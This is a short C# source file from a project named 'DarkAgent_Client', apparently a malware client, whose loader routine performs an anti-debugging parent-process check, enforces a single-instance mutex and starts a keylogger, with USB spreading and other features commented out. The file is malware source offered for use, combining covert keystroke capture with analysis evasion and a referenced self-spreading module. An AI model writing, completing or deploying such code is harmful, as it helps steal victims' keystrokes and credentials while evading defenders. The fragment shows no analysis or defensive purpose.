using DarkAgent_Client.src.Features;
using DarkAgent_Client.src.Features.Spreaders;

namespace DarkAgent_Client.src.Utils
{
    public class LoadFeatures
    {
        public static bool Load()
        {
            //Initialize all features
            if(Settings.SystemProcess_CheckParentProcess)
                AntiDebug.CheckParentProcess();

            if (SysMutex.CheckMutex() == false)
                return false;

            //UsbSpread usbSpread = new UsbSpread();

            //SystemProcess sysProc = new SystemProcess();
            Keylogger keylog = new Keylogger();
            //MsgBox msgbox = new MsgBox();
            return true;
        }
    }
}